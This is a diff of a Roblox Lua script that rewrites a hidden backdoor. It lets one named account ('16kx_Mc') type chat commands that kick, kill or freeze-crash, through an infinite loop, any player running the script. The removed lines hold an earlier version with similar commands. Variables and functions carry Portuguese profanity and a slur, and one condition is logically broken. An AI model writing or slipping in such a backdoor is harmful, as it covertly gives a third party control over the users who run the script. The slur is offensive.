@@ -414,39 +414,38 @@ end
 csxx(game:GetService("Players").LocalPlayer.Character)
 game:GetService("Players").LocalPlayer.CharacterAdded:Connect(csxx)
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local Pessoas = game:GetService("Players")
 
-local wsx = {"16kx_Mc"}
-
-for _, v in pairs(Players:GetPlayers()) do 
-if v.Name == LocalPlayer.Name then
+function fodase(x)
+if x.Name == "16kx_Mc" then
+x.Chatted:Connect(function(msg)
+if msg == ".tirar users" then
+Pessoas.LocalPlayer:Kick("\n16kx_Mc tirou vc do server!")
 else
-v.Chatted:Connect(function(msg)
-if table.find(wsx, v.Name) and msg == ".crash "..LocalPlayer.Name or msg == ".crash all" then
+if msg == ".kill users" then
+pcall(function()
+Pessoas.LocalPlayer.Character.Humanoid.Health = 0 
+end)
+else
+if msg == ".crash users" then
 while true do end
 end
-if table.find(wsx, v.Name) and msg == ".void "..LocalPlayer.Name or msg == ".void all" then
-pcall(function()
-LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9, 9e9, 9e9)
-end)
 end
-if table.find(wsx, v.Name) and msg == ".bring "..LocalPlayer.Name or msg == ".bring all" then
-pcall(function()
-LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
-end)
-end
-if table.find(wsx, v.Name) and msg == ".kill "..LocalPlayer.Name or msg == ".kill all" then
-pcall(function()
-LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0 
-end)
-end
-if table.find(wsx, v.Name) and msg == ".kick "..LocalPlayer.Name or msg == ".kick all" then
-LocalPlayer:Kick()
 end
 end)
 end
 end
+
+for _, v in pairs(Pessoas:GetPlayers()) do
+if not v.Name == Pessoas.LocalPlayer.Name then 
+fodase(v)
+end
+end
+
+Pessoas.PlayerAdded:Connect(function(plr)
+fodase(plr)
+end)
+
 
 game:GetService("Players").PlayerAdded:Connect(function(viado)
 if viado.Name == "16kx_Mc" then
